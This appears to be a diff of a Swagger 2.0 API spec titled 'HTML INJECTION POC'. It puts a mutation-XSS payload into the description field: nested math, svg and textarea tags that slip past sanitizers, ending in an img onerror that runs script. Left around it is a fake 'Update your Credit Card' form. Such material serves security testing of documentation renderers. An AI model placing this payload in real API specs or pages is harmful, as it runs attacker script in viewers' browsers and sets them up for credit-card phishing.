@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: HTML INJECTION POC
-  description: '<div class="creditCardForm">
+  description: '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
     <div class="heading">
         <h1>Update your Credit Card</h1>
     </div>
